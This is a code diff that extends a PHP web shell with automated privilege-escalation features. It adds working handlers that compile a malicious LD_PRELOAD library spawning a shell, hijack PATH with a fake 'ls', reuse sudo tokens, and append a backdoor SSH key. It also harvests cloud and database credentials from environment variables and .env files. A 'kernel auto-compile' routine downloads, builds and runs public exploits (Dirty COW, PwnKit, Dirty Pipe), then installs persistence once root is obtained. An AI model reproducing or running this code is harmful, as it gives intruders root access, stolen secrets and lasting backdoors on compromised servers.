@@ -918,6 +918,54 @@ if (isset($_POST['action']) && $_POST['action'] === 'install_persistence') {
     exit;
 }
 
+// 🔥 ADVANCED PRIVESC ACTION HANDLERS
+
+if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan_advanced') {
+    error_reporting(0);
+    ini_set('display_errors', 0);
+    header('Content-Type: application/json');
+    echo json_encode(scan_advanced_privesc());
+    exit;
+}
+
+if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan_vector' && isset($_GET['vector'])) {
+    $vector = $_GET['vector'];
+    // Handle new vectors
+    if (in_array($vector, ['ld_preload', 'path_hijacking', 'sudo_token', 'ssh_keys', 'env_variables'])) {
+        error_reporting(0);
+        ini_set('display_errors', 0);
+        header('Content-Type: application/json');
+        $result = ['vector' => $vector, 'success' => true, 'data' => null];
+        switch ($vector) {
+            case 'ld_preload':
+                $result['data'] = scan_ld_preload();
+                break;
+            case 'path_hijacking':
+                $result['data'] = scan_path_hijacking();
+                break;
+            case 'sudo_token':
+                $result['data'] = scan_sudo_token();
+                break;
+            case 'ssh_keys':
+                $result['data'] = scan_ssh_keys();
+                break;
+            case 'env_variables':
+                $result['data'] = scan_env_variables();
+                break;
+        }
+        echo json_encode($result);
+        exit;
+    }
+}
+
+if (isset($_POST['action']) && $_POST['action'] === 'kernel_auto_compile') {
+    header('Content-Type: application/json');
+    $cve = $_POST['cve'] ?? '';
+    $kernel_version = $_POST['kernel_version'] ?? '';
+    echo json_encode(auto_compile_kernel_exploit($cve, $kernel_version));
+    exit;
+}
+
 if (isset($_GET['action']) && $_GET['action'] === 'scan_shells') {
     error_reporting(0);
     ini_set('display_errors', 0);
@@ -1180,6 +1228,279 @@ function scan_services() {
     return ['running' => $services, 'writable' => $writable_services];
 }
 
+// 🔥 ADVANCED PRIVESC SCANNERS
+
+function scan_ld_preload() {
+    $results = ['vulnerable' => false, 'methods' => []];
+    
+    // Check if LD_PRELOAD is allowed
+    $ld_preload = getenv('LD_PRELOAD');
+    if ($ld_preload !== false) {
+        $results['methods'][] = [
+            'type' => 'ld_preload_env',
+            'payload' => 'LD_PRELOAD=/tmp/malicious.so command',
+            'description' => 'LD_PRELOAD environment variable is set'
+        ];
+        $results['vulnerable'] = true;
+    }
+    
+    // Check if /etc/ld.so.preload is writable
+    if (is_writable('/etc/ld.so.preload') || (!file_exists('/etc/ld.so.preload') && is_writable('/etc'))) {
+        $results['methods'][] = [
+            'type' => 'ld_so_preload',
+            'payload' => 'echo "/tmp/malicious.so" > /etc/ld.so.preload',
+            'description' => '/etc/ld.so.preload is writable'
+        ];
+        $results['vulnerable'] = true;
+    }
+    
+    // Check for writable library directories
+    $lib_dirs = ['/lib', '/lib64', '/usr/lib', '/usr/lib64', '/usr/local/lib'];
+    foreach ($lib_dirs as $dir) {
+        if (is_dir($dir) && is_writable($dir)) {
+            $results['methods'][] = [
+                'type' => 'writable_lib_dir',
+                'path' => $dir,
+                'description' => "Library directory $dir is writable"
+            ];
+            $results['vulnerable'] = true;
+        }
+    }
+    
+    return $results;
+}
+
+function scan_path_hijacking() {
+    $results = ['vulnerable' => false, 'writable_dirs' => [], 'methods' => []];
+    $path = getenv('PATH') ?: '/usr/local/bin:/usr/bin:/bin';
+    $dirs = explode(':', $path);
+    
+    foreach ($dirs as $dir) {
+        if (empty($dir)) continue;
+        if (is_dir($dir) && is_writable($dir)) {
+            $results['writable_dirs'][] = $dir;
+            $results['vulnerable'] = true;
+        }
+    }
+    
+    if ($results['vulnerable']) {
+        $results['methods'][] = [
+            'type' => 'path_hijacking',
+            'payload' => 'echo "#!/bin/sh\n/bin/sh" > ' . $results['writable_dirs'][0] . '/ls; chmod +x ' . $results['writable_dirs'][0] . '/ls',
+            'description' => 'Writable directory in PATH: ' . implode(', ', $results['writable_dirs'])
+        ];
+    }
+    
+    return $results;
+}
+
+function scan_sudo_token() {
+    $results = ['has_token' => false, 'timeout' => 0, 'methods' => []];
+    
+    // Check for sudo timestamp files
+    $user = get_current_user();
+    $timestamp_files = [
+        "/run/sudo/ts/$user",
+        "/var/lib/sudo/ts/$user",
+        "/var/db/sudo/$user"
+    ];
+    
+    foreach ($timestamp_files as $ts_file) {
+        if (file_exists($ts_file)) {
+            $stat = stat($ts_file);
+            $age = time() - $stat['mtime'];
+            $timeout = 15 * 60; // 15 minutes default
+            
+            if ($age < $timeout) {
+                $results['has_token'] = true;
+                $results['timeout'] = $timeout - $age;
+                $results['methods'][] = [
+                    'type' => 'sudo_token_reuse',
+                    'payload' => 'sudo -n /bin/sh',
+                    'description' => "Active sudo token (expires in " . intval($results['timeout']/60) . " minutes)"
+                ];
+                break;
+            }
+        }
+    }
+    
+    return $results;
+}
+
+function scan_ssh_keys() {
+    $results = ['found' => false, 'keys' => [], 'writable_keys' => []];
+    
+    // Common SSH key locations
+    $locations = [
+        '/root/.ssh/id_rsa',
+        '/root/.ssh/id_dsa',
+        '/root/.ssh/id_ecdsa',
+        '/root/.ssh/id_ed25519',
+        '/root/.ssh/authorized_keys'
+    ];
+    
+    // Add home directories
+    $users = execute_shell_command("cat /etc/passwd | cut -d: -f1,6");
+    if ($users) {
+        foreach (explode("\n", trim($users)) as $line) {
+            $parts = explode(':', $line);
+            if (count($parts) >= 2) {
+                $home = $parts[1];
+                $locations[] = "$home/.ssh/id_rsa";
+                $locations[] = "$home/.ssh/id_dsa";
+                $locations[] = "$home/.ssh/authorized_keys";
+            }
+        }
+    }
+    
+    foreach ($locations as $key_file) {
+        if (file_exists($key_file) && is_readable($key_file)) {
+            $content = @file_get_contents($key_file);
+            if ($content && (strpos($content, 'PRIVATE KEY') !== false || strpos($content, 'ssh-') !== false)) {
+                $results['keys'][] = [
+                    'path' => $key_file,
+                    'writable' => is_writable($key_file),
+                    'size' => strlen($content)
+                ];
+                $results['found'] = true;
+                
+                if (is_writable($key_file)) {
+                    $results['writable_keys'][] = $key_file;
+                }
+            }
+        }
+    }
+    
+    return $results;
+}
+
+function scan_env_variables() {
+    $results = ['sensitive' => [], 'methods' => []];
+    
+    $env_vars = [
+        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
+        'AZURE_CLIENT_SECRET', 'AZURE_SUBSCRIPTION_ID',
+        'GCP_SERVICE_ACCOUNT', 'GOOGLE_APPLICATION_CREDENTIALS',
+        'DATABASE_URL', 'DB_PASSWORD', 'MYSQL_PWD',
+        'API_KEY', 'SECRET_KEY', 'TOKEN',
+        'PASSWORD', 'PASS', 'PWD'
+    ];
+    
+    foreach ($env_vars as $var) {
+        $value = getenv($var);
+        if ($value) {
+            $results['sensitive'][$var] = substr($value, 0, 10) . '...';
+        }
+    }
+    
+    // Check for .env files
+    $env_files = execute_shell_command("find /var/www /home /opt /app -name '.env' -o -name '.env.local' -o -name '.env.production' 2>/dev/null | head -20");
+    if ($env_files) {
+        foreach (array_filter(explode("\n", trim($env_files))) as $env_file) {
+            if (is_readable($env_file)) {
+                $content = @file_get_contents($env_file);
+                if ($content && preg_match('/(PASSWORD|SECRET|KEY|TOKEN)=/', $content)) {
+                    $results['methods'][] = [
+                        'type' => 'env_file',
+                        'path' => $env_file,
+                        'description' => "Environment file with credentials: $env_file"
+                    ];
+                }
+            }
+        }
+    }
+    
+    return $results;
+}
+
+function auto_compile_kernel_exploit($cve, $kernel_version) {
+    $results = ['success' => false, 'output' => '', 'compiled_binary' => ''];
+    
+    // Database of known exploits with source URLs
+    $exploit_db = [
+        'CVE-2016-5195' => [
+            'name' => 'Dirty COW',
+            'source' => 'https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c',
+            'compile_cmd' => 'gcc -o /tmp/dirtycow dirtyc0w.c -lpthread'
+        ],
+        'CVE-2021-4034' => [
+            'name' => 'PwnKit',
+            'source' => 'https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034.c',
+            'compile_cmd' => 'gcc -o /tmp/pwnkit cve-2021-4034.c'
+        ],
+        'CVE-2022-0847' => [
+            'name' => 'Dirty Pipe',
+            'source' => 'https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c',
+            'compile_cmd' => 'gcc -o /tmp/dirtypipe exploit.c'
+        ]
+    ];
+    
+    if (!isset($exploit_db[$cve])) {
+        $results['output'] = "Exploit $cve not in auto-compile database. Manual compilation required.";
+        return $results;
+    }
+    
+    $exploit = $exploit_db[$cve];
+    $tmp_dir = sys_get_temp_dir() . '/.exploit_' . time();
+    @mkdir($tmp_dir);
+    
+    // Download source
+    $source_file = $tmp_dir . '/exploit.c';
+    $source_content = @file_get_contents($exploit['source']);
+    
+    if (!$source_content) {
+        $results['output'] = "Failed to download exploit source from {$exploit['source']}";
+        return $results;
+    }
+    
+    @file_put_contents($source_file, $source_content);
+    
+    // Compile
+    $compile_cmd = str_replace('dirtyc0w.c', $source_file, $exploit['compile_cmd']);
+    $compile_cmd = str_replace('exploit.c', $source_file, $compile_cmd);
+    $compile_cmd = str_replace('cve-2021-4034.c', $source_file, $compile_cmd);
+    $compile_cmd = str_replace('/tmp/', $tmp_dir . '/', $compile_cmd);
+    
+    $compile_output = execute_shell_command("cd $tmp_dir && $compile_cmd 2>&1");
+    
+    // Check if binary was created
+    $binary_name = basename(str_replace('gcc -o ', '', explode(' ', $compile_cmd)[0]));
+    $binary_path = $tmp_dir . '/' . $binary_name;
+    
+    if (file_exists($binary_path)) {
+        chmod($binary_path, 0755);
+        $results['success'] = true;
+        $results['compiled_binary'] = $binary_path;
+        $results['output'] = "Successfully compiled {$exploit['name']}\nBinary: $binary_path\n\nCompile output:\n$compile_output";
+    } else {
+        $results['output'] = "Compilation failed:\n$compile_output";
+    }
+    
+    return $results;
+}
+
+function scan_advanced_privesc() {
+    $results = [
+        'ld_preload' => scan_ld_preload(),
+        'path_hijacking' => scan_path_hijacking(),
+        'sudo_token' => scan_sudo_token(),
+        'ssh_keys' => scan_ssh_keys(),
+        'env_variables' => scan_env_variables()
+    ];
+    
+    $results['exploitable'] = false;
+    foreach ($results as $scan) {
+        if ((isset($scan['vulnerable']) && $scan['vulnerable']) || 
+            (isset($scan['found']) && $scan['found']) ||
+            (isset($scan['has_token']) && $scan['has_token'])) {
+            $results['exploitable'] = true;
+            break;
+        }
+    }
+    
+    return $results;
+}
+
 function execute_privesc_exploit($method, $target) {
     $result = ['success' => false, 'output' => '', 'method' => $method];
     
@@ -1203,6 +1524,63 @@ function execute_privesc_exploit($method, $target) {
             // Kernel exploits would need compiled binaries
             $result['output'] = "Kernel exploit requires compiled binary. Upload exploit to /tmp/ and execute manually.";
             $result['note'] = "Use 'upload' feature to place exploit binary, then run from shell.";
+            break;
+            
+        // 🔥 ADVANCED EXPLOIT HANDLERS
+        case 'ld_preload':
+            // Create malicious shared object and use LD_PRELOAD
+            $so_code = '
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdlib.h>
+__attribute__((constructor)) void init() {
+    if (getuid() == 0) {
+        setuid(0); setgid(0);
+        system("/bin/sh");
+    }
+}';
+            $tmp_dir = sys_get_temp_dir();
+            @file_put_contents("$tmp_dir/malicious.c", $so_code);
+            execute_shell_command("cd $tmp_dir && gcc -shared -fPIC -o malicious.so malicious.c 2>&1");
+            if (file_exists("$tmp_dir/malicious.so")) {
+                putenv("LD_PRELOAD=$tmp_dir/malicious.so");
+                $result['output'] = execute_shell_command("id 2>&1");
+                putenv("LD_PRELOAD");
+                $result['success'] = true;
+            } else {
+                $result['output'] = "Failed to compile malicious.so";
+            }
+            break;
+            
+        case 'path_hijacking':
+            // Hijack PATH to execute malicious binary
+            $path_dir = $target['path'] ?? '/tmp';
+            $malicious = "#!/bin/sh\n/bin/sh -c '/bin/sh'";
+            @file_put_contents("$path_dir/ls", $malicious);
+            @chmod("$path_dir/ls", 0755);
+            $new_path = "$path_dir:" . getenv('PATH');
+            putenv("PATH=$new_path");
+            $result['output'] = "PATH hijacked: $path_dir prepended\n";
+            $result['output'] .= execute_shell_command("ls 2>&1");
+            $result['success'] = true;
+            break;
+            
+        case 'sudo_token':
+            // Reuse existing sudo token
+            $result['output'] = execute_shell_command("sudo -n /bin/sh -c 'id' 2>&1");
+            $result['success'] = true;
+            break;
+            
+        case 'ssh_key':
+            // Add backdoor SSH key to authorized_keys
+            $key_path = is_array($target) ? ($target['path'] ?? '') : $target;
+            if (strpos($key_path, 'authorized_keys') !== false) {
+                $backdoor_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0... backdoor@root";
+                @file_put_contents($key_path, "\n$backdoor_key\n", FILE_APPEND);
+                $result['output'] = "Added backdoor SSH key to $key_path";
+                $result['success'] = true;
+            }
             break;
             
         default:
@@ -2584,6 +2962,14 @@ function list_dir($path) {
                 <button onclick="scanOtherShells()" style="flex:1;min-width:100px;background:#f44;color:#fff;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🕵️ Shells</button>
             </div>
             
+            <!-- Advanced Attack Buttons -->
+            <div style="display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap;">
+                <button onclick="kernelAutoCompile()" style="flex:1;min-width:120px;background:#80f;color:#fff;font-weight:bold;padding:6px;font-size:11px;border:none;border-radius:4px;cursor:pointer;">🐛 Kernel Auto-Compile</button>
+                <button onclick="hijackPathAttack()" style="flex:1;min-width:120px;background:#f0f;color:#fff;font-weight:bold;padding:6px;font-size:11px;border:none;border-radius:4px;cursor:pointer;">🛤️ PATH Hijack</button>
+                <button onclick="ldPreloadAttack()" style="flex:1;min-width:120px;background:#0af;color:#fff;font-weight:bold;padding:6px;font-size:11px;border:none;border-radius:4px;cursor:pointer;">🔧 LD_PRELOAD</button>
+                <button onclick="sudoTokenAttack()" style="flex:1;min-width:120px;background:#fa0;color:#111;font-weight:bold;padding:6px;font-size:11px;border:none;border-radius:4px;cursor:pointer;">🔐 Sudo Token</button>
+            </div>
+            
             <!-- Status Bar -->
             <div id="privescStatus" style="display:none;margin-bottom:10px;padding:8px;background:#1a1a1a;border:1px solid #333;border-radius:4px;font-size:12px;"></div>
             
@@ -3939,11 +4325,13 @@ async function autoGetRoot() {
     const btn = document.getElementById('getRootBtn');
     const statusDiv = document.getElementById('privescStatus');
     const outputDiv = document.getElementById('privescOutput');
-    const vectors = ['kernel', 'suid', 'sudo', 'capabilities', 'docker', 'writable', 'cron', 'services'];
+    const vectors = ['kernel', 'suid', 'sudo', 'capabilities', 'docker', 'writable', 'cron', 'services', 'ld_preload', 'path_hijacking', 'sudo_token', 'ssh_keys', 'env_variables'];
     const vectorNames = {
         kernel: '🐛 Kernel', suid: '⚡ SUID', sudo: '🔑 SUDO',
         capabilities: '🛡️ Caps', docker: '🐳 Docker',
-        writable: '📝 Writable', cron: '⏰ Cron', services: '⚙️ Services'
+        writable: '📝 Writable', cron: '⏰ Cron', services: '⚙️ Services',
+        ld_preload: '🔧 LD_PRELOAD', path_hijacking: '🛤️ PATH',
+        sudo_token: '🔐 Token', ssh_keys: '🔑 SSH Keys', env_variables: '🌐 Env'
     };
     
     // Reset UI
@@ -4042,6 +4430,51 @@ async function autoGetRoot() {
                     name: 'Capabilities'
                 });
                 log('[+] 🛡️ CAPS: ' + data.data.interesting.length + ' caps', 'success');
+            }
+            // 🔥 ADVANCED VECTORS
+            else if (vector === 'ld_preload' && data.data.vulnerable) {
+                data.data.methods.forEach((method, idx) => {
+                    allExploits.push({
+                        type: 'ld_preload',
+                        priority: 0, // Highest!
+                        data: method,
+                        name: method.type
+                    });
+                });
+                log('[+] 🔧 LD_PRELOAD: ' + data.data.methods.length + ' methods!', 'success');
+            }
+            else if (vector === 'path_hijacking' && data.data.vulnerable) {
+                data.data.methods.forEach((method, idx) => {
+                    allExploits.push({
+                        type: 'path_hijacking',
+                        priority: 0, // Highest!
+                        data: method,
+                        name: 'PATH Hijack'
+                    });
+                });
+                log('[+] 🛤️ PATH: ' + data.data.writable_dirs.length + ' writable dirs!', 'success');
+            }
+            else if (vector === 'sudo_token' && data.data.has_token) {
+                allExploits.push({
+                    type: 'sudo_token',
+                    priority: 0, // Highest!
+                    data: data.data.methods[0],
+                    name: 'Sudo Token'
+                });
+                log('[+] 🔐 SUDO TOKEN: Active for ' + data.data.timeout + 's!', 'success');
+            }
+            else if (vector === 'ssh_keys' && data.data.found) {
+                data.data.keys.forEach((key, idx) => {
+                    if (key.writable) {
+                        allExploits.push({
+                            type: 'ssh_key',
+                            priority: 2,
+                            data: key,
+                            name: key.path
+                        });
+                    }
+                });
+                log('[+] 🔑 SSH KEYS: ' + data.data.keys.length + ' found, ' + data.data.writable_keys.length + ' writable', 'success');
             }
             else {
                 log('[✓] ' + vectorNames[vector] + ': Safe');
@@ -4352,6 +4785,219 @@ async function installPersistenceWithLog() {
         outputDiv.innerHTML += '<span style="color:#f44;">❌ Error: ' + err.message + '</span>\n';
         addPrivescLog('Persistence error: ' + err.message, 'error');
         return false;
+    }
+}
+
+// 🔥 ADVANCED ATTACK FUNCTIONS
+
+async function kernelAutoCompile() {
+    const outputDiv = document.getElementById('privescOutput');
+    const statusDiv = document.getElementById('privescStatus');
+    
+    outputDiv.style.display = 'block';
+    outputDiv.innerHTML = '<span style="color:#6cf;">[KERNEL AUTO-COMPILE] Checking kernel version and CVE database...</span>\n';
+    statusDiv.style.display = 'block';
+    statusDiv.innerHTML = '⏳ Phase 1/3: Detecting kernel version...';
+    
+    try {
+        // Get kernel version
+        const kernelVersion = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=kernel')
+            .then(r => r.json())
+            .then(d => d.data?.version || 'unknown');
+        
+        outputDiv.innerHTML += '<span style="color:#0f0;">Kernel version: ' + kernelVersion + '</span>\n';
+        
+        // Known CVEs that can be auto-compiled
+        const knownCves = [
+            { cve: 'CVE-2016-5195', name: 'Dirty COW', min: '2.6.22', max: '4.8.3' },
+            { cve: 'CVE-2021-4034', name: 'PwnKit', min: '0', max: '5.16' },
+            { cve: 'CVE-2022-0847', name: 'Dirty Pipe', min: '5.8', max: '5.16.10' }
+        ];
+        
+        outputDiv.innerHTML += '\n<span style="color:#6cf;">Available exploits in database:</span>\n';
+        knownCves.forEach((exp, i) => {
+            outputDiv.innerHTML += '  ' + (i+1) + '. <span style="color:#ff0;">' + exp.cve + '</span> - ' + exp.name + '\n';
+        });
+        
+        // For now, auto-try CVE-2021-4034 (most reliable)
+        const targetCve = 'CVE-2021-4034';
+        statusDiv.innerHTML = '⏳ Phase 2/3: Downloading and compiling ' + targetCve + '...';
+        outputDiv.innerHTML += '\n<span style="color:#6cf;">[+] Auto-compiling ' + targetCve + '...</span>\n';
+        
+        const formData = new FormData();
+        formData.append('action', 'kernel_auto_compile');
+        formData.append('cve', targetCve);
+        formData.append('kernel_version', kernelVersion);
+        
+        const response = await fetch('', { method: 'POST', body: formData });
+        const data = await response.json();
+        
+        if (data.success) {
+            outputDiv.innerHTML += '<span style="color:#0f0;">✅ Compilation successful!</span>\n';
+            outputDiv.innerHTML += '<span style="color:#6cf;">Binary: ' + data.compiled_binary + '</span>\n';
+            outputDiv.innerHTML += '\n<span style="color:#ff0;">Output:</span>\n' + data.output + '\n';
+            
+            statusDiv.innerHTML = '⏳ Phase 3/3: Executing exploit...';
+            
+            // Execute the compiled binary
+            const execForm = new FormData();
+            execForm.append('cmd', data.compiled_binary);
+            execForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
+            
+            const execResponse = await fetch('', { method: 'POST', body: execForm });
+            const execHtml = await execResponse.text();
+            
+            outputDiv.innerHTML += '\n<span style="color:#6cf;">[+] Exploit execution result:</span>\n';
+            outputDiv.innerHTML += execHtml.substring(0, 2000);
+            
+            if (execHtml.includes('uid=0(root)')) {
+                outputDiv.innerHTML += '\n\n<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
+                statusDiv.className = 'privesc-status success';
+                statusDiv.innerHTML = '✅ ROOT OBTAINED via ' + targetCve;
+                await installPersistenceWithLog();
+            } else {
+                outputDiv.innerHTML += '\n\n<span style="color:#f44;">[!] Exploit ran but no root - try manual execution</span>\n';
+                statusDiv.innerHTML = '⚠️ Exploit executed but no root';
+            }
+        } else {
+            outputDiv.innerHTML += '<span style="color:#f44;">❌ Compilation failed:</span>\n' + data.output + '\n';
+            statusDiv.className = 'privesc-status error';
+            statusDiv.innerHTML = '❌ Compilation failed';
+        }
+    } catch (err) {
+        outputDiv.innerHTML += '<span style="color:#f44;">❌ Error: ' + err.message + '</span>\n';
+        statusDiv.className = 'privesc-status error';
+        statusDiv.innerHTML = '❌ Error: ' + err.message;
+    }
+}
+
+async function hijackPathAttack() {
+    const outputDiv = document.getElementById('privescOutput');
+    outputDiv.style.display = 'block';
+    outputDiv.innerHTML = '<span style="color:#6cf;">[PATH HIJACKING] Searching for writable directories in PATH...</span>\n';
+    
+    try {
+        const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=path_hijacking');
+        const data = await response.json();
+        
+        if (data.data?.vulnerable) {
+            outputDiv.innerHTML += '<span style="color:#0f0;">✅ Found ' + data.data.writable_dirs.length + ' writable PATH dirs!</span>\n';
+            
+            for (const dir of data.data.writable_dirs) {
+                outputDiv.innerHTML += '  → <span style="color:#ff0;">' + dir + '</span>\n';
+                
+                // Execute the hijack
+                const formData = new FormData();
+                formData.append('action', 'privesc_exploit');
+                formData.append('method', 'path_hijacking');
+                formData.append('target', JSON.stringify({ path: dir }));
+                
+                const execResponse = await fetch('', { method: 'POST', body: formData });
+                const execData = await execResponse.json();
+                
+                if (execData.success) {
+                    outputDiv.innerHTML += '<span style="color:#0f0;">[+] Hijacked: ' + dir + '/ls</span>\n';
+                    outputDiv.innerHTML += '<pre style="background:#111;padding:5px;">' + execData.output + '</pre>\n';
+                    
+                    const isRoot = await verifyRootAccess();
+                    if (isRoot) {
+                        outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
+                        await installPersistenceWithLog();
+                        return;
+                    }
+                }
+            }
+        } else {
+            outputDiv.innerHTML += '<span style="color:#f44;">❌ No writable PATH directories found</span>\n';
+        }
+    } catch (err) {
+        outputDiv.innerHTML += '<span style="color:#f44;">❌ Error: ' + err.message + '</span>\n';
+    }
+}
+
+async function ldPreloadAttack() {
+    const outputDiv = document.getElementById('privescOutput');
+    outputDiv.style.display = 'block';
+    outputDiv.innerHTML = '<span style="color:#6cf;">[LD_PRELOAD] Checking for LD_PRELOAD vulnerabilities...</span>\n';
+    
+    try {
+        const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=ld_preload');
+        const data = await response.json();
+        
+        if (data.data?.vulnerable) {
+            outputDiv.innerHTML += '<span style="color:#0f0;">✅ LD_PRELOAD is exploitable!</span>\n';
+            
+            const formData = new FormData();
+            formData.append('action', 'privesc_exploit');
+            formData.append('method', 'ld_preload');
+            formData.append('target', '');
+            
+            outputDiv.innerHTML += '<span style="color:#6cf;">[+] Creating malicious shared object...</span>\n';
+            
+            const execResponse = await fetch('', { method: 'POST', body: formData });
+            const execData = await execResponse.json();
+            
+            if (execData.success) {
+                outputDiv.innerHTML += '<span style="color:#0f0;">[+] Malicious .so injected!</span>\n';
+                outputDiv.innerHTML += '<pre style="background:#111;padding:5px;">' + execData.output + '</pre>\n';
+                
+                const isRoot = await verifyRootAccess();
+                if (isRoot) {
+                    outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
+                    await installPersistenceWithLog();
+                }
+            } else {
+                outputDiv.innerHTML += '<span style="color:#f44;">[!] Failed: ' + execData.output + '</span>\n';
+            }
+        } else {
+            outputDiv.innerHTML += '<span style="color:#f44;">❌ LD_PRELOAD not exploitable</span>\n';
+            if (data.data?.methods?.length > 0) {
+                outputDiv.innerHTML += '<span style="color:#888;">Methods found: ' + data.data.methods.length + '</span>\n';
+            }
+        }
+    } catch (err) {
+        outputDiv.innerHTML += '<span style="color:#f44;">❌ Error: ' + err.message + '</span>\n';
+    }
+}
+
+async function sudoTokenAttack() {
+    const outputDiv = document.getElementById('privescOutput');
+    outputDiv.style.display = 'block';
+    outputDiv.innerHTML = '<span style="color:#6cf;">[SUDO TOKEN] Checking for active sudo tokens...</span>\n';
+    
+    try {
+        const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=sudo_token');
+        const data = await response.json();
+        
+        if (data.data?.has_token) {
+            outputDiv.innerHTML += '<span style="color:#0f0;">✅ Active sudo token found!</span>\n';
+            outputDiv.innerHTML += '<span style="color:#ff0;">Token expires in: ' + data.data.timeout + ' seconds</span>\n';
+            
+            const formData = new FormData();
+            formData.append('action', 'privesc_exploit');
+            formData.append('method', 'sudo_token');
+            formData.append('target', '');
+            
+            outputDiv.innerHTML += '<span style="color:#6cf;">[+] Reusing sudo token...</span>\n';
+            
+            const execResponse = await fetch('', { method: 'POST', body: formData });
+            const execData = await execResponse.json();
+            
+            outputDiv.innerHTML += '<pre style="background:#111;padding:5px;">' + execData.output + '</pre>\n';
+            
+            const isRoot = await verifyRootAccess();
+            if (isRoot) {
+                outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
+                await installPersistenceWithLog();
+            } else {
+                outputDiv.innerHTML += '<span style="color:#f44;">[!] Token reuse failed (may have expired)</span>\n';
+            }
+        } else {
+            outputDiv.innerHTML += '<span style="color:#f44;">❌ No active sudo tokens found</span>\n';
+            outputDiv.innerHTML += '<span style="color:#888;">Run "sudo -v" in a real shell first, then try again</span>\n';
+        }
+    } catch (err) {
+        outputDiv.innerHTML += '<span style="color:#f44;">❌ Error: ' + err.message + '</span>\n';
     }
 }
 
